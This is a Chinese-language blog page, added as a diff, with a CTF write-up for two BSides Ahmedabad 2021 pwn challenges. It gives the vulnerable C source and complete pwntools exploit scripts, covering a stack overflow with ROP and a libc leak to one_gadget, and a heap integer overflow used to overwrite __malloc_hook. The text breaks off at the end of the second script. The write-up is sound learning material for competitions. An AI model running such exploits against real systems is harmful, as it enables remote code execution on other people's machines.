@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":230,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="快乐周末，赶紧复现🤯">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BSides Ahmedabad CTF 2021">
+<meta property="og:url" content="http://example.com/2021/11/07/BSidesAhmedabadCTF2021/index.html">
+<meta property="og:site_name" content="71&#39;s blog">
+<meta property="og:description" content="快乐周末，赶紧复现🤯">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/11/07/aF5bWz8MlDgY3Pk.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/07/EmR4nIgFSMuCWx1.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/07/d1LtFjy7PaAv4fu.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/07/7EtbnKSN1zIefaP.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/07/JuEYwr2AWkg74Ki.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/07/1JsbKy6SnfQtwpV.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/08/fyVMHdQIs1WhgGA.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/08/fJXiOTRSC3ldcsj.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/08/N3QFuImwx4sY1KD.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/08/eQ2UOJRdEW6tM7m.png">
+<meta property="article:published_time" content="2021-11-07T03:34:07.000Z">
+<meta property="article:modified_time" content="2021-11-08T15:43:31.085Z">
+<meta property="article:author" content="7ee1n">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/11/07/aF5bWz8MlDgY3Pk.png">
+
+<link rel="canonical" href="http://example.com/2021/11/07/BSidesAhmedabadCTF2021/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>BSides Ahmedabad CTF 2021 | 71's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">71's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/07/BSidesAhmedabadCTF2021/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="7ee1n">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="71's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BSides Ahmedabad CTF 2021
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-11-07 11:34:07" itemprop="dateCreated datePublished" datetime="2021-11-07T11:34:07+08:00">2021-11-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-11-08 23:43:31" itemprop="dateModified" datetime="2021-11-08T23:43:31+08:00">2021-11-08</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2021/11/07/BSidesAhmedabadCTF2021/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/11/07/BSidesAhmedabadCTF2021/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>快乐周末，赶紧复现🤯 </p>
+</blockquote>
+<span id="more"></span>
+
+<p>题目全给了源码，都是 2.31 的环境。原本用习惯了 ubuntu18.04，可能用久了，一卡一卡的，一换 20 就极度流畅🤤，挂机重开也不会断网。有个题需要同时 patch 两个文件 ，在18上弄了一会决定换20了，patch多麻烦啊【bushi</p>
+<h1 id="BabyBOF-RCE"><a href="#BabyBOF-RCE" class="headerlink" title="BabyBOF:RCE"></a>BabyBOF:RCE</h1><blockquote>
+<p>amd64-64-little，Partial RELRO， No canary found，NX enabled， No PIE (0x400000)</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> feedback[<span class="number">0x40</span>];</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter your feedback: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, feedback);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>栈溢出，没有地址可知的可写段。因此用 puts_plt 泄露 libc 地址，打 one_gadget。</p>
+<p>en.. 做题的时候懵了一会，跟着前面 puts(“…”) 的参数写，多写了几个寄存器，导致后面跳回主函数的时候栈变化太大。puts就一个参数啊【我在想什么… 不过后续要是在主函数执行莫名其妙段错误的话，可以先排查下栈环境，看看是不是前面覆盖的时候写多了。</p>
+<p> onegadget 的执行都是有条件的，可以看到这里的 r12 和 r15 不满足条件。因此在调用前需要先清空这些寄存器。</p>
+<p><img src="https://i.loli.net/2021/11/07/aF5bWz8MlDgY3Pk.png"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;pwn2.bsidesahmedabad.in&#x27;</span>,<span class="number">9001</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;vuln&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s: p.recvuntil(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s: p.recv(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : p.sendlineafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> s: p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s: p.send(s)</span><br><span class="line">it = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x0000000000401273</span></span><br><span class="line">pop_4_ret=<span class="number">0x000000000040126c</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;feedback: &#x27;</span>)</span><br><span class="line">py=<span class="string">&#x27;a&#x27;</span>*<span class="number">72</span></span><br><span class="line">py+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)</span><br><span class="line">py+=p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">sl(py)</span><br><span class="line">ru(<span class="string">&#x27;you!&#x27;</span>)</span><br><span class="line">libcbase=u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x0875a0</span></span><br><span class="line">success(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">og=libcbase+<span class="number">0xe6c7e</span><span class="comment">#one_gadget</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;feedback: &#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;a&#x27;</span>*<span class="number">72</span>+p64(pop_4_ret)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(og))</span><br><span class="line">it()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="padnote"><a href="#padnote" class="headerlink" title="padnote"></a>padnote</h1><blockquote>
+<p>amd64-64-little，Full RELRO， Canary found，NX enabled，PIE enabled，Enabled</p>
+</blockquote>
+<p>堆题：</p>
+<ul>
+<li>create: calloc 分配 size 大小的 chunk，id为0-3。</li>
+<li>edit: 从 chunk[offset] 开始写 count 个字节，会检查 offset + count &lt;= size。</li>
+<li>print：连续打印，可泄露</li>
+<li>delete：无uaf</li>
+</ul>
+<p>不得不说这次真的被源码坑了。理论上堆题的洞会在新增的花里胡哨的地方，比如这里 edit 的时候，弄了个 offset 和 count 来写。offset 和 count 都只判断是否大于零，加起来再判断是否小于size，就很怪？但源码怎么看都没溢出，三个变量的类型都是 int，结构体里的 size 也是 int。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EditNote</span><span class="params">(Note *note)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> offset, count, epos;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check if note is empty */</span></span><br><span class="line">  <span class="keyword">if</span> (!note-&gt;content)</span><br><span class="line">    CHECK_FAIL(<span class="string">&quot;Note is empty&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input offset */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Offset: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d%*c&quot;</span>, &amp;offset) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// IO error</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input count */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Count: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d%*c&quot;</span>, &amp;count) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// IO error</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Security check */</span></span><br><span class="line">  <span class="keyword">if</span> (offset &lt; <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">&quot;Invalid offset&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">&quot;Invalid count&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((epos = offset + count) &lt; <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">&quot;Integer overflow&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (epos &gt; note-&gt;size)</span><br><span class="line">    CHECK_FAIL(<span class="string">&quot;Out-of-bound access&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Edit content */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  ReadLine(&amp;note-&gt;content[offset], count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>群上有师傅发现 ida 分析的可执行文件是有溢出的。【emmm，看来以后源码只能辅助分析了。】</p>
+<p><img src="https://i.loli.net/2021/11/07/EmR4nIgFSMuCWx1.png"></p>
+<p>DWORD，无符号整型，这里是 *a1 的 note[i] 中的 size 。两个有符号数加起来变成负数的话，肯定能过这个 check了。四字节</p>
+<p>最大的正数是 0x7ffff ffff，所以我们的 count 得输入非常大的数字，加上只检查是否大于零，任意写了属于是。</p>
+<p><img src="https://i.loli.net/2021/11/07/d1LtFjy7PaAv4fu.png"></p>
+<p>u1s1 calloc挺好用的，需要填充 tcache 或者跟 top chunk 隔开的时候，直接 dele、add就可以了。因此虽然这里只限制了4个chunk，但也完全够用。思路：</p>
+<ol>
+<li>修改size位，堆块重叠，泄露 unsorted bin 中的 libc 地址。</li>
+<li>打fastbin，修改 fd 指针，改mallochook。</li>
+</ol>
+<p>跟 <strong>babybof:rce</strong> 那题同样的问题，执行到 one_gadget 的时候 r12 不满足条件。但是这里又不能执行 pop 指令。看了 wp 才知道可以调用 realloc_plt 前面的 mov 指令👍。因此这里的 mallochook 就覆盖成下面这段指令，而不是简单的 realloc 函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7f03bc6bc601 &lt;__vfscanf_internal+19073&gt;:	mov    r12,r9</span><br><span class="line">0x7f03bc6bc604 &lt;__vfscanf_internal+19076&gt;:	mov    rsi,rbx</span><br><span class="line">0x7f03bc6bc607 &lt;__vfscanf_internal+19079&gt;:	call   0x7f03bc676370 &lt;realloc@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;pwn2.bsidesahmedabad.in&#x27;</span>,<span class="number">9003</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;chall&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s: p.recvuntil(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s: p.recv(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : p.sendlineafter(y,x)</span><br><span class="line">sda = <span class="keyword">lambda</span> x,y : p.sendafter(y,x)</span><br><span class="line">sl = <span class="keyword">lambda</span> s: p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s: p.send(s)</span><br><span class="line">it = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">num</span>):</span></span><br><span class="line">	sla(<span class="built_in">str</span>(num),<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">id</span>,size,con</span>):</span></span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="built_in">str</span>(<span class="built_in">id</span>),<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">	sla(<span class="built_in">str</span>(size),<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">	sda(con,<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,offset,count,con</span>):</span></span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	sla(<span class="built_in">str</span>(<span class="built_in">id</span>),<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">	sla(<span class="built_in">str</span>(offset),<span class="string">&#x27;Offset: &#x27;</span>)</span><br><span class="line">	sla(<span class="built_in">str</span>(count),<span class="string">&#x27;Count: &#x27;</span>)</span><br><span class="line">	sda(con,<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="built_in">str</span>(<span class="built_in">id</span>),<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	menu(<span class="number">4</span>)</span><br><span class="line">	sla(<span class="built_in">str</span>(<span class="built_in">id</span>),<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">&#x27;aaaa\n&#x27;</span>)</span><br><span class="line">	dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">&#x27;overwrite\n&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x28</span>,<span class="string">&#x27;fakechunk\n&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x408</span>,<span class="string">&#x27;padding\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)<span class="comment">#tcache</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x28</span>,<span class="string">&#x27;leaklibc\n&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>,<span class="string">&#x27;padding\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0x7fffffff</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x17</span>+p64(<span class="number">0x471</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">dele(<span class="number">1</span>)<span class="comment">#unsortedbin</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x470</span>-<span class="number">0x30</span>-<span class="number">0x10</span>,<span class="string">&#x27;padding\n&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">libcbase=u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">one_gadget=[<span class="number">0xe6c7e</span>,<span class="number">0xe6c81</span>,<span class="number">0xe6c84</span>]</span><br><span class="line">og=one_gadget[<span class="number">0</span>]+libcbase</span><br><span class="line">malloc_hook=libcbase+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	dele(<span class="number">0</span>)</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">&#x27;aaaa\n&#x27;</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>,<span class="string">&#x27;fastbin\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0x7fffffff</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x67</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook-<span class="number">0x33</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">&#x27;padding\n&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>,<span class="string">&#x27;aaa&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(og)+p64(libcbase+<span class="number">0x6b601</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">sla(<span class="built_in">str</span>(<span class="number">0x28</span>),<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">it()</span><br><span 